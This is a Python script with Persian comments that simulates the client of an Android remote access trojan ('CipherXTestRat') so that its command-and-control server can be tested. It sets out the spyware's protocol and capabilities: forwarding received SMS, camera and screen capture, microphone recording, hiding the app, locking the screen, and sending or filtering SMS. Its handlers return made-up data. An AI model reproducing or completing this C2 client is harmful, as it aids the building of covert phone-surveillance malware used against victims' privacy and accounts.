import socket
import threading
import json
import time
import random
import string

class Client:
    """
    این کلاس کلاینت را شبیه‌سازی می‌کند که به سرور شما متصل می‌شود.
    """

    def __init__(self, server_ip, server_port, client_port, client_password):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_port = client_port
        self.client_password = client_password
        
        # تولید شناسه یکتا و ثابت برای این کلاینت
        self.device_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        self.socket = None
        self.sms_filter = set() # برای نگهداری شماره‌های فیلتر شده

        print(f"[*] Client Initialized. Device ID: {self.device_id}")

    def _send_json(self, data):
        """یک متد داخلی برای ارسال پیام‌های JSON به سرور."""
        if self.socket:
            try:
                self.socket.sendall((json.dumps(data) + '\n').encode('utf-8'))
                print(f"[SENT] -> {data['method']}")
            except (ConnectionResetError, BrokenPipeError):
                print("[ERROR] Connection lost. Could not send message.")
                self.socket = None

    def _get_initial_data(self):
        """اطلاعات اولیه برای ارسال در پیام connect را تولید می‌کند."""
        return {
            "port": self.client_port,
            "password": self.client_password,
            "device_id": self.device_id,
            "accessory": [
                "openUrl", "sendToast", "vibratePhone", "getGeoLocation", "receiveSMS",
                "getInstalledApps", "hideApp", "unhideApp", "changeIcon", "lockScreen", "unlockScreen",
                "getAllSMS", "takeScreenshot", "takeBackshot", "takeFrontshot", "recordFront",
                "recordBack", "recordMicrophone", "getClipboard", "setSoundVolume", "sendSMS",
                "setSMSFilter", "removeSMSFilter"
            ],
            "rat": "super",
            "battery": random.randint(10, 100),
            "model": "Test",
            "android_version": 14,
            "method": "connect"
        }

    def _handle_command(self, command):
        """دستورات دریافتی از سرور را پردازش می‌کند."""
        method = command.get("method")
        print(f"[RECEIVED] <- Command: {method}")

        handlers = {
            "openUrl": lambda: print(f"  -> Opening URL: {command.get('url')}"),
            "sendToast": lambda: print(f"  -> Displaying Toast: {command.get('message')}"),
            "setSMSFilter": lambda: self.sms_filter.add(command.get('filter_number')) or print(f"  -> Filter added for: {command.get('filter_number')}"),
            "removeSMSFilter": lambda: self.sms_filter.remove(command.get('filter_number')) or print(f"  -> Filter removed for: {command.get('filter_number')}"),
            "changeIcon": lambda: print(f"  -> Changing icon to: {command.get('icon')}"),
            "sendSMS": lambda: print(f"  -> Sending SMS to {command.get('tonumber')}: {command.get('sms')}"),
            "getInstalledApps": lambda: self._send_json(self._get_installed_apps_response()),
            "getGeoLocation": lambda: self._send_json(self._get_geolocation_response()),
            # TODO: متدهای دیگر را به همین شکل اضافه کنید
        }

        handler = handlers.get(method)
        if handler:
            handler()
        else:
            print(f"  -> Unknown command: {method}")

    # --- متدهای پاسخ‌دهی به دستورات ---
    
    def _get_base_response(self, method):
        """ساختار پایه برای تمام پیام‌های ارسالی را می‌سازد."""
        return {
            "port": self.client_port,
            "password": self.client_password,
            "device_id": self.device_id,
            "rat": "super",
            "method": method
        }

    def _get_installed_apps_response(self):
        response = self._get_base_response("getInstalledApps_response")
        response["apps"] = [
            {"package_name": "org.telegram.messenger", "name": "Telegram", "size": 105838631},
            {"package_name": "com.whatsapp", "name": "WhatsApp", "size": 89478485},
            {"package_name": "com.google.android.youtube", "name": "YouTube", "size": 152984882},
        ]
        return response

    def _get_geolocation_response(self):
        response = self._get_base_response("getGeoLocation_response")
        response["latitude"] = 35.7219
        response["longitude"] = 51.3347
        return response

    def _listen_for_commands(self):
        """در یک ترد جداگانه به دستورات سرور گوش می‌دهد."""
        buffer = ""
        while self.socket:
            try:
                data = self.socket.recv(1024).decode('utf-8')
                if not data:
                    break # اتصال قطع شده
                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    command = json.loads(line)
                    self._handle_command(command)
            except (ConnectionResetError, json.JSONDecodeError, UnicodeDecodeError):
                break # خروج از حلقه در صورت خطا
        print("[INFO] Listener thread stopped.")
        self.socket = None

    def _simulate_sms_receiver(self):
        """در یک ترد جداگانه، دریافت پیامک را شبیه‌سازی می‌کند."""
        time.sleep(30) # کمی صبر برای برقراری اتصال اولیه
        
        while True:
            # یک پیامک نمونه
            sender = "+989123456789"
            message_text = "qwervwecrwerijwercwie\n23242\nqkeoqckoeqwec\n23434\nTest 34342"
            name = "Test Kon"
            print(f"\n[SIMULATE] SMS received from {sender}")
            if sender not in self.sms_filter:
                sms_data = self._get_base_response("receiveSMS")
                sms_data["sms"] = message_text
                sms_data["name"] = name
                sms_data["phone_number"] = sender
                self._send_json(sms_data)
            else:
                print(f"  -> SMS from {sender} is filtered. Not sending to server.")

            time.sleep(random.randint(30, 60)) # هر ۳۰ تا ۶۰ ثانیه یک پیامک شبیه‌سازی می‌شود
            
    def connect_and_run(self):
        """به سرور متصل شده و تردها را راه‌اندازی می‌کند."""
        while True:
            try:
                print(f"[*] Attempting to connect to {self.server_ip}:{self.server_port}...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                print("[SUCCESS] Connected to server!")

                # ارسال پیام اولیه
                self._send_json(self._get_initial_data())

                # راه‌اندازی ترد شنونده
                listener_thread = threading.Thread(target=self._listen_for_commands, daemon=True)
                listener_thread.start()

                # راه‌اندازی ترد شبیه‌ساز SMS
                sms_thread = threading.Thread(target=self._simulate_sms_receiver, daemon=True)
                sms_thread.start()

                # منتظر بمان تا اتصال قطع شود
                listener_thread.join()

            except ConnectionRefusedError:
                print("[ERROR] Connection refused. Is the server running?")
            except Exception as e:
                print(f"[ERROR] An unexpected error occurred: {e}")
            
            finally:
                if self.socket:
                    self.socket.close()
                self.socket = None
                print("[INFO] Connection closed. Retrying in 10 seconds...")
                time.sleep(10)

if __name__ == '__main__':
    # --- تنظیمات کلاینت ---
    SERVER_IP = "192.168.102.135"  # IP سرور خود را اینجا وارد کنید
    SERVER_PORT = 9932       # پورت سرور خود را اینجا وارد کنید
    
    CLIENT_PORT_NAME = "CipherXTestRat"
    CLIENT_PASSWORD_NAME = "CipherXTestRat"
    
    client = Client(SERVER_IP, SERVER_PORT, CLIENT_PORT_NAME, CLIENT_PASSWORD_NAME)
    client.connect_and_run()